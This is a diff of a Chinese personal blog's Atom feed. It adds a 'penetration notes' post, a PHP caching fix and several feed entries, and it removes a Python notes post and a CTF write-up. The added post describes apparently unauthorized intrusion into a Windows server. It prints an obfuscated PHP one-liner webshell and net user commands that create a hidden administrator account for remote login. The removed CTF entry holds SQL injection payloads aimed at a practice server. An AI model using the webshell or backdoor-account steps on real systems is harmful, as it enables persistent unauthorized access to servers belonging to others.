@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://lazysheep.cc/"/>
-  <updated>2015-06-05T13:27:45.000Z</updated>
+  <updated>2015-06-20T13:58:05.000Z</updated>
   <id>http://lazysheep.cc/</id>
   
   <author>
@@ -13,6 +13,74 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[渗透笔记①]]></title>
+    <link href="http://lazysheep.cc/2015/06/18/2A/"/>
+    <id>http://lazysheep.cc/2015/06/18/2A/</id>
+    <published>2015-06-18T13:29:23.000Z</published>
+    <updated>2015-06-20T13:58:05.000Z</updated>
+    <content type="html"><![CDATA[<p><em>一次小型渗透笔记, 嘘~</em><img src="/img/2A.gif" alt="图"><br><a id="more"></a><br>由于某些原因,又日了台某个地方的win服务器. 拿到了webshell以后,想搞到图形界面,上次搞过,不过忘了,现在又要查,因此记录下来,做备忘….</p>
+<p>找到一个较猥琐的一句话..<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">(<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="string">'url'</span>]).@<span class="variable">$_</span>(<span class="variable">$_POST</span>[<span class="string">'uurrll'</span>]);</span><br><span class="line"><span class="comment">//url要为assert</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>其实我也很水…拿到webshell后也不知道该干嘛..只知道win可以想办法搞到图形界面…linux的就不会了..</p>
+<hr>
+<h2 id="win_图形界面的获取">win 图形界面的获取</h2><p>思路很简单..就是通过远程连接,,重要的是获得管理员账号..不过获得了webshell 并不等于知道了管理员账号密码…不过可以通过webshell再次创建一个管理员账号,,步骤如下…</p>
+<blockquote>
+<p>通过菜刀,可以获得虚拟终端…不得不说..菜刀真是个webshell的神器..</p>
+</blockquote>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">C:</span>\&gt; net user root <span class="number">123456</span> /<span class="keyword">add</span>     <span class="preprocessor">#创建一个用户名为root密码为123456的账号 </span></span><br><span class="line"></span><br><span class="line"><span class="label">C:</span>\&gt; net localgroup administrators root /<span class="keyword">add</span>    <span class="preprocessor">#将root用户添加到administrators用户组</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>之后就可以通过这个新建的用户远程登录服务器..</p>
+</blockquote>
+<p>通过之类的渗透, 发现在这类情况下linux服务器的优势, 一般获得的webshell, 在linux大部分都属于普通权限, 基本上只有通过0day之类的提权漏洞获得root权限, 而win权限处理的却不是很好…</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><em>一次小型渗透笔记, 嘘~</em><img src="/img/2A.gif" alt="图"><br>]]>
+    
+    </summary>
+    
+      <category term="笔记" scheme="http://lazysheep.cc/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Web缓存小记]]></title>
+    <link href="http://lazysheep.cc/2015/06/13/0x29/"/>
+    <id>http://lazysheep.cc/2015/06/13/0x29/</id>
+    <published>2015-06-13T13:22:18.000Z</published>
+    <updated>2015-06-13T13:36:26.000Z</updated>
+    <content type="html"><![CDATA[<p><strong>最近用thinkphp写网页的时候，老是被php缓存问题搞得难受死了，今天终于解决了。</strong><br><a id="more"></a></p>
+<p>最开始以为是tp框架的缓存问题，可是tp开了调试模式后，缓存都是关的。</p>
+<p>后面又怀疑是php缓存的问题，百度之后知道，php是通过http头关闭缓存，我查看了下http头，缓存是关的。</p>
+<p>然后还怀疑是nginx缓存，这个时候得知，上面三种(框架，php，nginx)都是缓存js,css静态文件，而我出现的是php缓存问题，比如<code>echo 1;</code> 改成<code>echo 2;</code>，这个不会马上生效。</p>
+<p>这个时候就知道前面搜索的方式都是错误的，之后百度，nginx php缓存。。终于找到了。。。</p>
+<p>问题是ZendOpcache扩展缓存的问题。</p>
+<p>查看是否是这个问题，和修改的方法如下：</p>
+<blockquote>
+<ul>
+<li>访问phpinfo()，查看有没有opcache这个扩展，如果没有，就和我的问题不一样了，下面的可以忽略</li>
+<li>opcache.revalidate_freq=60 查看这个值是否不等于0，ctrl+f可以快速搜索。</li>
+<li>之后修改php.ini文件，同样是快速搜索到相应行，把这个变量的值改为0</li>
+</ul>
+</blockquote>
+<p>Resolved!</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><strong>最近用thinkphp写网页的时候，老是被php缓存问题搞得难受死了，今天终于解决了。</strong><br>]]>
+    
+    </summary>
+    
+      <category term="php" scheme="http://lazysheep.cc/tags/php/"/>
+    
+      <category term="web" scheme="http://lazysheep.cc/tags/web/"/>
+    
+      <category term="缓存" scheme="http://lazysheep.cc/tags/%E7%BC%93%E5%AD%98/"/>
+    
+      <category term="S-essay" scheme="http://lazysheep.cc/categories/S-essay/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[墙网杯总结]]></title>
@@ -571,94 +639,6 @@
     </summary>
     
       <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
-    
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[Python 入门笔记]]></title>
-    <link href="http://lazysheep.cc/2015/02/25/0x14/"/>
-    <id>http://lazysheep.cc/2015/02/25/0x14/</id>
-    <published>2015-02-25T11:30:16.000Z</published>
-    <updated>2015-03-13T06:24:46.000Z</updated>
-    <content type="html"><![CDATA[<p><strong>最近在学python,,不过脑子太蠢….什么都不住..只好靠烂笔头了…不过技术宅不用烂笔头,,,用博客..</strong><br><a id="more"></a></p>
-<blockquote>
-<ul>
-<li>Ctrl + L  //清屏;</li>
-<li>dir() and help() //这两个可以理解为是帮助菜单….待我理解的更深入的时候再补充;</li>
-<li>在help()查看帮助的页面,按p退出;</li>
-<li><p>python几个函数的特殊使用方法 :</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">(*a)</span>:</span></span><br><span class="line">.．.	<span class="keyword">print</span> a</span><br><span class="line">.．.</span><br><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">fun2</span><span class="params">(**a)</span>:</span></span><br><span class="line">.．.	<span class="keyword">print</span> a</span><br><span class="line">.．.</span><br><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">fun3</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">.．.	<span class="keyword">print</span> a,b,c</span><br><span class="line">.．.</span><br><span class="line">&gt;&gt;&gt;fun1(<span class="number">2</span>,<span class="number">3.0</span>,<span class="string">'a'</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="number">3.0</span>, <span class="string">'a'</span>)</span><br><span class="line">&gt;&gt;&gt;fun2(x=<span class="string">'a'</span>,y=<span class="number">2</span>)</span><br><span class="line">&#123;<span class="string">'y'</span>: <span class="number">2</span>, <span class="string">'x'</span>: <span class="string">'a'</span>&#125;</span><br><span class="line">&gt;&gt;&gt;dd = (<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="number">2</span>)</span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>fun3(*dd)</span><br><span class="line">a b <span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;cc = &#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="string">'c'</span>,<span class="string">'c'</span>:<span class="number">3</span>&#125;</span><br><span class="line">&gt;&gt;&gt;fun3(**cc)</span><br><span class="line"><span class="number">1</span> c <span class="number">3</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>=2015.3.8= 今天发现了一个好用的函数，，vars()　／／显示出函数运行前储存的所以变量，以字典形式输出．</p>
-</li>
-<li>import 与 from<br>import sys ≈ from sys import *<br>不同之处在于，import　之后是以 <code>sys.stdout.write(&#39;abc&#39;)</code> 的形式引用，而from 是以 <code>stdout.write(&#39;abc&#39;)</code> 形式引用，，from 有变量重复被覆盖的危险。。</li>
-<li>看了很多的代码都是以下面的代码开始运行：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ce.py</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==  <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'abc'</span></span><br><span class="line">	.....................</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</blockquote>
-<p>开始很疑惑，，因为我运行 <strong>name</strong>值都为 ‘<strong>main</strong>‘，那这个语句有什么用。。。现在知道了，加上这个语句之后<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">python</span> <span class="keyword">ce</span>.<span class="keyword">py</span></span><br><span class="line"><span class="keyword">abc</span>                          //直接运行这个脚本，会输出<span class="keyword">abc</span></span><br><span class="line">$<span class="keyword">python</span></span><br><span class="line">&gt;&gt;&gt;import <span class="keyword">ce</span></span><br><span class="line">&gt;&gt;&gt;                              #在别的地方导入这个文件，则不会输出，因为这个时候<span class="keyword">ce</span>.__name__ == <span class="string">'ce'</span></span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<ul>
-<li></li>
-</ul>
-</blockquote>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p><strong>最近在学python,,不过脑子太蠢….什么都不住..只好靠烂笔头了…不过技术宅不用烂笔头,,,用博客..</strong><br>]]>
-    
-    </summary>
-    
-      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
-    
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[Week4]]></title>
-    <link href="http://lazysheep.cc/2015/02/15/0x13/"/>
-    <id>http://lazysheep.cc/2015/02/15/0x13/</id>
-    <published>2015-02-15T14:30:12.000Z</published>
-    <updated>2015-04-18T13:33:32.000Z</updated>
-    <content type="html"><![CDATA[<p><strong>本周题没上周那么容易做了,,第一题我觉得算是misc吧,,第二题是注入,,第三题是代码审计,,</strong></p>
-<a id="more"></a>
-<p>==================================================write time : 15/2 22:30</p>
-<h2 id="0x0A_bAD(Rank:100)">0x0A bAD(Rank:100)</h2><p>链接点进去，除了一个大标题外什么也没有，源码，http头也找不到任何信息，，所以重点就集中在VIM上了，，，不知道你们看到VIM会想到什么，（没用过的肯定什么也想不到），，我想到的是～结尾的备份文件，（有强迫症，所以对～的备份文件印象特别深．），所以试了一下 <a href="http://104.236.171.163/week4/bad/index.php~" target="_blank" rel="external">http://104.236.171.163/week4/bad/index.php~</a> ，不过不行，所以猜测有其他种类的备份文件，然后去谷歌　＇VIM＇　＇备份＇ ＇漏洞＇根据这三个关键词，，找到了，，，最后这样 <a href="http://104.236.171.163/week4/bad/index.php.swp" target="_blank" rel="external">http://104.236.171.163/week4/bad/index.php.swp</a> 把文件下载下来得到 Flag…</p>
-<p>不过现在这个链接却是错误的,后来才知道原来是我运气好才做出来了,,百度一下 ‘vim swp’ 后发现备份文件是这样的 <code>.文件名.swp</code></p>
-<p>所以正确的题解应该是 <a href="http://104.236.171.163/week4/bad/.index.php.swp" target="_blank" rel="external">http://104.236.171.163/week4/bad/.index.php.swp</a></p>
-<p>所以说我前面能做出来只是运气罢了……-_-</p>
-<h2 id="0x0B_White(Rank:200)">0x0B White(Rank:200)</h2><p>这题,开始以为是XSS,,不过后面却提示了是注入,而且是在 <a href="http://104.236.171.163/week4/white/message.php" target="_blank" rel="external">http://104.236.171.163/week4/white/message.php</a> 留言页面,,,’title’ 和 ‘content’ 都可以注入…可是注了半天..都是报wrong错误….最后使用了一个笨方法,,构造了这样一个payload : </p>
-<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">title=</span><span class="number">20</span>&amp;<span class="variable">content=</span><span class="number">0</span>' <span class="constant">or</span> (ord(mid((select  flag from flag limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))  &lt;&gt; <span class="number">101</span>) <span class="constant">or</span> '<span class="number">0</span></span><br></pre></td></tr></table></figure>
-<p>由于这个方法太过笨拙…就不细说了…</p>
-<p>后来得知是二阶注入,,然后去研究,,还是没找出简单的方法….</p>
-<p>今天看了writeup后才明白,,,,原来是用户名这里有问题,,</p>
-<p>我以前构造的都是 :<br><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="number">2</span><span class="char">','</span>sdf<span class="char">','</span>afsa')<span class="comment">#&amp;content=ag</span></span><br></pre></td></tr></table></figure></p>
-<p>最后一部分..就是上面payload中’afsa’这里,,,提示错误,是因为没有 afsa 用户,,所以这里要改成当前用户,,然后就可以注入成功了,,,构造payload :<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=x',(<span class="operator"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="string">'当前用户名'</span>)#&amp;content=<span class="number">12</span></span></span><br></pre></td></tr></table></figure></p>
-<p>Get Flag !<br>//    22/2 20:00 modify</p>
-<h2 id="0x0C_懒得起名字了(Rank:200)">0x0C 懒得起名字了(Rank:200)</h2><p>这题首先查源码,查HTTP头,,然后在HTTP头中发现</p>
-<p><code>tips    Why not try .bak?</code></p>
-<p>然后通过 <a href="http://104.236.171.163/week4/noname/index.php.bak" target="_blank" rel="external">http://104.236.171.163/week4/noname/index.php.bak</a></p>
-<p>下载源码,,没PHP基础的就无解了….有php基础的然后就是读源代码…发现输入都过滤了…所以这题应该不是注入题….源码中给出了一个用户名 ‘lightless’ 和密码 ‘abc!10O0o’</p>
-<p>这题我们只知道lightless这一个用户名…可是用这个用户登陆又会提示 <code>you account is blocked</code> </p>
-<p>而且又没法注入,,所以这个时候我的想法是…有什么字符,mysql会忽略….php却不会…然后尝试url编码….全部跑了一遍都不行…</p>
-<p>最后随便试了一下lightlesS 登陆….</p>
-<p>Get Flag!!</p>
-<p>简直……..只能怪自己学艺不精……</p>
-<p>=============================================</p>
-<p>最后一次集训了….说说感受….在这几次集训中…学到了很多…发现了很多不足…也学会了一些猥琐流…收获很大….对于这是最后一次了…非常遗憾…</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p><strong>本周题没上周那么容易做了,,第一题我觉得算是misc吧,,第二题是注入,,第三题是代码审计,,</strong></p>]]>
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
-    
-      <category term="SQLi" scheme="http://lazysheep.cc/tags/SQLi/"/>
-    
-      <category term="代码审计" scheme="http://lazysheep.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
       <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
     
